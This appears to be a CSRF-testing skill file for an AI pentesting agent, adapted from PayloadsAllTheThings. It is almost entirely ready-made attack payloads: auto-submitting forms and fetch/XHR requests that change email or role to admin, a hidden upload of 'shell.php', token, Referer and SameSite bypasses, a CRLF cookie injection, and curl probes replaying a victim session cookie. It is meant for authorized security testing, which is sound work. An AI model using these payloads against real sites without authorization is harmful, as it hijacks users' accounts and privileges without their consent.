---
description: Auto-submit forms, JSON CSRF, token bypass techniques
skill: csrf-testing
source: PayloadsAllTheThings — Cross-Site Request Forgery
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# CSRF (Cross-Site Request Forgery) Payloads

> Source: PayloadsAllTheThings — Cross-Site Request Forgery

## Auto-Submit Forms

### GET-Based CSRF

```html
<!-- Image tag triggers GET request -->
<img src="http://target.example/api/changeEmail?email=attacker@evil.example">

<!-- Hidden iframe -->
<iframe src="http://target.example/api/deleteAccount?confirm=true" style="display:none"></iframe>
```

### POST-Based CSRF (Auto-Submit)

```html
<form id="csrf" action="http://target.example/api/changeEmail" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example">
  <input type="hidden" name="confirm" value="true">
</form>
<script>document.getElementById("csrf").submit();</script>
```

### POST with Enctype (Bypass Content-Type Checks)

```html
<form id="csrf" action="http://target.example/api/setUsername" enctype="text/plain" method="POST">
  <input name="username" type="hidden" value="hacked">
</form>
<script>document.getElementById("csrf").submit();</script>
```

## JSON CSRF

### XHR-Based

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.example/api/changeRole", true);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.withCredentials = true;
xhr.send('{"role":"admin"}');
</script>
```

### Form-Based JSON (Content-Type Trick)

```html
<form id="csrf" action="http://target.example/api/changeRole" enctype="text/plain" method="POST">
  <input type="hidden" name='{"role":"admin","extra":"' value='"}'>
</form>
<script>document.getElementById("csrf").submit();</script>
```

This sends: `{"role":"admin","extra":"="}` which is valid JSON.

### Fetch API

```html
<script>
fetch('http://target.example/api/changeRole', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: '{"role":"admin"}'
});
</script>
```

Note: This triggers a pre-flight if Content-Type is `application/json`. Works only if CORS allows it.

## File Upload CSRF

```html
<script>
function launch() {
  const dt = new DataTransfer();
  const file = new File(["malicious content"], "shell.php");
  dt.items.add(file);
  document.forms[0][0].files = dt.files;
  document.forms[0].submit();
}
</script>
<form method="post" action="http://target.example/upload" enctype="multipart/form-data" style="display:none">
  <input type="file" name="file">
</form>
<button onclick="launch()">Click</button>
```

## Token Bypass Techniques

### Remove Token Entirely

```html
<!-- Some apps only validate token if present, skip validation if absent -->
<form action="http://target.example/api/action" method="POST">
  <!-- No csrf_token field at all -->
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
```

### Method Switch (POST to GET)

```html
<!-- App validates CSRF token on POST but not GET -->
<img src="http://target.example/api/changeEmail?email=attacker@evil.example">
```

### Token Not Tied to Session

```html
<!-- Use attacker's own valid CSRF token if tokens aren't session-bound -->
<form action="http://target.example/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="ATTACKER_VALID_TOKEN">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
```

### Duplicate Cookie Pattern Bypass

If the app checks that a cookie value matches a form parameter:

```html
<!-- Inject cookie via CRLF or subdomain, then match in form -->
<img src="http://target.example/path%0d%0aSet-Cookie:csrf=fake">
<form action="http://target.example/api/action" method="POST">
  <input type="hidden" name="csrf" value="fake">
</form>
```

### Referer Header Bypass

```html
<!-- Strip Referer entirely -->
<meta name="referrer" content="no-referrer">
<form action="http://target.example/api/action" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>

<!-- Include target domain in Referer path -->
<!-- Host PoC at: https://attacker.example/target.example/csrf.html -->
```

## SameSite Cookie Bypass

```html
<!-- SameSite=Lax allows GET requests from top-level navigation -->
<a href="http://target.example/api/action?email=attacker@evil.example">Click here</a>

<!-- Force top-level navigation with window.open -->
<script>window.open('http://target.example/api/action?email=attacker@evil.example')</script>
```

## Useful Curl for Testing

Run all target-facing curl probes via `vigil assess kali exec --technique CSRF --intent "<why>" --probe-kind payload --phase <phase> --timeout <seconds> -- curl ...` so the request lands in the audit pipeline. Keep explicit Cookie overrides only when replaying a victim session on purpose.

```bash
# Check if endpoint accepts requests without CSRF token
vigil assess kali exec --technique CSRF \
  --intent "CSRF probe: POST without token to /api/action" \
  --probe-kind payload --phase consume-test --timeout 30 -- \
  curl -s -X POST http://target.example/api/action \
    -H "Cookie: session=VICTIM_SESSION" \
    -d "email=test@test.com"

# Check if endpoint accepts GET instead of POST
vigil assess kali exec --technique CSRF \
  --intent "CSRF probe: method switch GET vs POST on /api/action" \
  --probe-kind payload --phase consume-test --timeout 30 -- \
  curl -s "http://target.example/api/action?email=test@test.com" \
    -H "Cookie: session=VICTIM_SESSION"

# Check Referer validation
vigil assess kali exec --technique CSRF \
  --intent "CSRF probe: cross-origin Referer on /api/action" \
  --probe-kind payload --phase consume-test --timeout 30 -- \
  curl -s -X POST http://target.example/api/action \
    -H "Cookie: session=VICTIM_SESSION" \
    -H "Referer: https://evil.example/" \
    -d "email=test@test.com"
```
